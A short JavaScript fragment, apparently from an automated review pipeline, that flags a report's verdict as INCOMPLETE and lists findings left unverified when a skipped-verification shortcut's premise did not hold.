function markVerdictIncomplete(text) {
  if (floorPremiseHeld) return text
  const lines = String(text).split('\n')
  const head = lines.findIndex(l => /^#+\s*Verdict\b/i.test(l.trim()))
  if (head < 0) return text
  const at = lines.findIndex((l, i) => i > head && l.trim())
  if (at < 0 || /INCOMPLETE/.test(/** @type {string} */ (lines[at]))) return text
  lines[at] = `${lines[at]} · ⚠️ INCOMPLETE — ${savedByFloor.length} verification(s) were skipped because the verdict stood at Block, and the run did not end at Block; those findings are unverified for a reason that did not apply.`
  return lines.join('\n')
}

function floorPremiseSection() {
  if (floorPremiseHeld) return ''
  return `\n\n## ⚠️ INCOMPLETE — a verification saving whose premise did not hold\n`
    + `${savedByFloor.length} batch verification(s) were deliberately not dispatched because the verdict stood at Block when their turn came, and no judgement on a Medium can move a Block. The run ended at ${recordVerdict}. The saving therefore rested on a confirmed finding that did not reach the final verdict, and those findings are UNVERIFIED for no good reason — treat this section as a coverage hole and re-run. They are listed under Unverified above.\n`
    + savedByFloor.map(n => `- ${n}`).join('\n')
}

// Appended, not asked of the synthesis model: a finding set aside by a prior decision must reach the
// reader with that decision, whatever the model chose to render.
return out(markVerdictIncomplete(report || fallbackReport()) + floorPremiseSection() + priorRejectedSection(priorRejected) + scopeSection())
